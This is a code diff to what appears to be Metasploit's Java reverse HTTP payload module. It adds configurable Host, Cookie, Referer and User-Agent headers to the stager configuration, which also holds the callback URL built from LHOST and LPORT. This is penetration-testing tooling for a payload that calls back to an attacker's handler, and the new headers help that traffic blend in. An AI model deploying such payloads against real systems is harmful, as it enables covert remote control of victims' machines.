@@ -24,8 +24,11 @@ module Payload::Java::ReverseHttp
   def initialize(*args)
     super
     register_advanced_options([
-      Msf::OptInt.new('Spawn', [true, 'Number of subprocesses to spawn', 2]),
-      Msf::OptInt.new('StagerURILength', [false, 'The URI length for the stager (at least 5 bytes)'])
+      OptInt.new('Spawn', [true, 'Number of subprocesses to spawn', 2]),
+      OptInt.new('StagerURILength', [false, 'The URI length for the stager (at least 5 bytes)']),
+      OptString.new('HttpHeaderHost', [false, 'An optional value to use for the Host HTTP header']),
+      OptString.new('HttpHeaderCookie', [false, 'An optional value to use for the Cookie HTTP header']),
+      OptString.new('HttpHeaderReferer', [false, 'An optional value to use for the Referer HTTP header']),
     ])
   end
 
@@ -64,6 +67,10 @@ module Payload::Java::ReverseHttp
 
     c =  ''
     c << "Spawn=#{ds["Spawn"] || 2}\n"
+    c << "HeaderUser-Agent=#{ds["MeterpreterUserAgent"]}\n" if ds["MeterpreterUserAgent"]
+    c << "HeaderHost=#{ds["HttpHeaderHost"]}\n" if ds["HttpHeaderHost"]
+    c << "HeaderReferer=#{ds["HttpHeaderReferer"]}\n" if ds["HttpHeaderReferer"]
+    c << "HeaderCookie=#{ds["HttpHeaderCookie"]}\n" if ds["HttpHeaderCookie"]
     c << "URL=#{scheme}://#{ds['LHOST']}"
     c << ":#{ds['LPORT']}" if ds['LPORT']
     c << luri
